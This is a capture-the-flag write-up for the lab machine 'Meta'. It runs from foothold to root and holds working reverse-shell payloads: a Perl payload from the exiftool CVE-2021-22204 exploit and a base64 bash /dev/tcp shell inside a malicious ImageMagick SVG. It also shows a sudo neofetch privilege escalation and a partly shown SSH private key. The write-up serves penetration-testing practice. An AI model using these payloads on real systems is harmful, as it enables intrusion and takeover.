#### info enum
port 20,80 open

For http
set hosts file, artcorp.htb
use ffuf to brute force subdomain, get dev01. From the declare on index page, can also get info a dev applcation is acitve

on dev01, a link on it, open it will be redirected to a upload page, for extract exif info of images uploaded.

`└─$ sudo dirsearch -u http://dev01.artcorp.htb/metaview/`
```
[05:13:32] Starting: metaview/
[05:13:58] 301 -  249B  - /metaview/assets  ->  http://dev01.artcorp.htb/metaview/assets/
[05:14:04] 200 -   72B  - /metaview/composer.json
[05:14:07] 301 -  246B  - /metaview/css  ->  http://dev01.artcorp.htb/metaview/css/
[05:14:22] 301 -  246B  - /metaview/lib  ->  http://dev01.artcorp.htb/metaview/lib/
[05:14:50] 301 -  250B  - /metaview/uploads  ->  http://dev01.artcorp.htb/metaview/uploads/
[05:14:51] 200 -    0B  - /metaview/vendor/composer/autoload_files.php
[05:14:51] 200 -    0B  - /metaview/vendor/composer/autoload_psr4.php
[05:14:51] 200 -    0B  - /metaview/vendor/composer/autoload_classmap.php
[05:14:51] 200 -    0B  - /metaview/vendor/composer/autoload_static.php
[05:14:51] 200 -    3KB - /metaview/vendor/composer/LICENSE
[05:14:51] 200 -    0B  - /metaview/vendor/autoload.php
[05:14:51] 200 -    0B  - /metaview/vendor/composer/autoload_namespaces.php
[05:14:51] 200 -    0B  - /metaview/vendor/composer/autoload_real.php
[05:14:51] 200 -    0B  - /metaview/vendor/composer/ClassLoader.php
```
```
└─$ curl http://dev01.artcorp.htb/metaview/composer.json
{
    "autoload": {
        "files": ["lib/ExifToolWrapper.php"]
    }
}    
```
http://dev01.artcorp.htb/metaview/index.php  
> this page is for uploading and showing the metadata of an images file use uploaded
> https://www.exploit-db.com/exploits/50911
> After googling exiftool.php, lib/exiftoo are vulnerated to this poc
> use this poc to crate a pic file for uploading to get a reverse shell.
`└─$ python3 50911.py  -s 10.10.16.9 8821`
```
        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
RUNNING: UNICORD Exploit for CVE-2021-22204
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(8821,inet_aton('10.10.16.9')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")
RUNTIME: DONE - Exploit image written to 'image.jpg'

#### foothold
```
upload this malicious image to the page, set nc listener
`└─$ nc -nvlp 8821`
```
listening on [any] 8821 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.140] 51342
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c "import pty;pty.spawn('/bin/bash')"
```
#### lateral move
After some enum, plus linpeas, nothing useful found. check active processes
```
pspy64

2026/01/07 09:12:01 CMD: UID=0     PID=18824  | /usr/sbin/CRON -f 
2026/01/07 09:12:01 CMD: UID=0     PID=18823  | /usr/sbin/cron -f 
2026/01/07 09:12:01 CMD: UID=0     PID=18822  | /usr/sbin/CRON -f 
2026/01/07 09:12:01 CMD: UID=0     PID=18821  | /usr/sbin/CRON -f 
2026/01/07 09:12:01 CMD: UID=0     PID=18820  | /usr/sbin/CRON -f 
2026/01/07 09:12:01 CMD: UID=0     PID=18825  | /usr/sbin/CRON -f 
2026/01/07 09:12:01 CMD: UID=0     PID=18826  | /usr/sbin/CRON -f 
2026/01/07 09:12:01 CMD: UID=0     PID=18827  | /usr/sbin/CRON -f 
2026/01/07 09:12:01 CMD: UID=1000  PID=18828  | /bin/bash /usr/local/bin/convert_images.sh 
2026/01/07 09:12:01 CMD: UID=0     PID=18829  | /usr/sbin/CRON -f 
2026/01/07 09:12:01 CMD: UID=1000  PID=18830  | /bin/bash /usr/local/bin/convert_images.sh 
2026/01/07 09:12:01 CMD: UID=0     PID=18831  | /usr/sbin/CRON -f 
2026/01/07 09:12:01 CMD: UID=0     PID=18833  | /bin/sh -c rm /var/www/dev01.artcorp.htb/convert_images/* 
2026/01/07 09:12:01 CMD: UID=0     PID=18832  | /bin/sh -c rm /var/www/dev01.artcorp.htb/metaview/uploads/* 
2026/01/07 09:12:01 CMD: UID=1000  PID=18834  | 
2026/01/07 09:12:01 CMD: UID=0     PID=18835  | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 
2026/01/07 09:12:01 CMD: UID=0     PID=18836  | /bin/sh -c rm /tmp/* 
```
Found /bin/bash /usr/local/bin/convert_images.sh is executed routiely, by UID 1000 user
`thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash`
`ls -l /usr/local/bin/convert_images.sh`
```
<tb/metaview$ ls -l /usr/local/bin/convert_images.sh
-rwxr-xr-x 1 root root 126 Jan  3  2022 /usr/local/bin/convert_images.sh
```
`www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cat /usr/local/bin/convert_images.sh`
```
<.htb/metaview$ cat /usr/local/bin/convert_images.sh
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```
```
which mogrify
/usr/local/bin/mogrify
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ ls -la /usr/local/bin/mogrify
<p.htb/convert_images$ ls -la /usr/local/bin/mogrify     
lrwxrwxrwx 1 root root 6 Aug 29  2021 /usr/local/bin/mogrify -> magick
```
cannot modify this file, search for vuln of it
`www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ /usr/local/bin/mogrify --version `
```
<tb/convert_images$ /usr/local/bin/mogrify --version     
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib
```
https://github.com/lnwza0x0a/CVE-2020-29599/blob/main/exploit.svg?short_path=16f828c
use this poc, put it into convert_images folder wait for crontask to run it.
ehco bash -i tcp reverse shell payload into base64 encoded

`$ cat r.svg`
```
<image authenticate='ff" `echo "YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOS80NDQgMD4mMSAK" | base64 -d | bash  `;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:r.svg" height="100" width="100"/>
  </svg>
</image>
```
in target machine, wget it, it is always better to test the s.svg  running by current user to calidate
```
wget http://10.10.16.9:/r.svg

└─$ nc -nvlp 444
listening on [any] 444 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.140] 54750
bash: cannot set terminal process group (1332): Inappropriate ioctl for device
bash: no job control in this shell
thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ 
```

`thomas@meta:~/.ssh$ cat id_rsa `
```
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5
x7up3z5s/H/yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvV
...
M4ofDQ3csqhrNLlvA68QRPMaZ9bFgYjhB1A1pGxOmu9Do+LNu0qr2/GBcCvYY2kI4GFINe
bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=
-----END OPENSSH PRIVATE KEY-----
```
#### Escalate Privi
`thomas@meta:~$ sudo -l`
```
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

sudoers file set env_keep, which means when use sudo command, config home environment will be take into account.

`thomas@meta:~$ echo $XDG_CONFIG_HOME`
`            `
it is blank, which means it will use default config under ~/.config
`thomas@meta:~$ neofetch \"\"`
```
       _,met$$$$$gg.          thomas@meta 
    ,g$$$$$$$$$$$$$$$P.       --------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
 ,$$P'              `$$$.     Host: VMware Virtual Platform None 
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
`d$$'     ,$P"'   .    $$$    Uptime: 50 mins 
 $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
 $$;      Y$b._   _,d$P'      CPU: AMD EPYC 7313P 16- (2) @ 2.994GHz 
 Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
 `$$b      "-.__              Memory: 117MiB / 1994MiB 
  `Y$$
   `Y$$.                                              
     `$$b.
       `Y$$b.
          `"Y$b._
              `"""
```
change the environment patameter to root

`thomas@meta:~$ export XDG_CONFIG_HOME="/home/root/.config"`
```
thomas@meta:~$ sudo neofetch \"\"
       _,met$$$$$gg.          root@meta 
    ,g$$$$$$$$$$$$$$$P.       --------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
 ,$$P'              `$$$.     Host: VMware Virtual Platform None 
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
`d$$'     ,$P"'   .    $$$    Uptime: 52 mins 
 $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
 $$;      Y$b._   _,d$P'      CPU: AMD EPYC 7313P 16- (2) @ 2.994GHz 
 Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
 `$$b      "-.__              Memory: 118MiB / 1994MiB 
  `Y$$
   `Y$$.                                              
     `$$b.
       `Y$$b.
          `"Y$b._
              `"""
```
we can manupuate the config.conf, and switch back it to thomas home/.config
`echo 'exec /bin/sh' > .config/neofetch/config.conf`
`thomas@meta:~$ export XDG_CONFIG_HOME="/home/thomas/.config"`
```
In Linux, exec is a shell built‑in command that replaces the current process with a new one. Unlike running a program normally (which spawns a child process),
exec discards the current shell and makes the specified command take its place
```
```
thomas@meta:~$ cat .config/neofetch/config.conf 
exec /bin/sh
thomas@meta:~$ sudo neofetch 
# id
uid=0(root) gid=0(root) groups=0(root)
```

#### lesson learned
- care about each piece of the info on web page, for this one, it is a clue for fuzzing subdomain
- pspy to check processes whorthy a try
- for vuln payload, care of every point we should modify, otherwise, errors will be propted
- use base64 encode to ensure the payload is delivered fine
- sudoers file,  env_keep+=XDG_CONFIG_HOME
- exec in linux to replace the application 
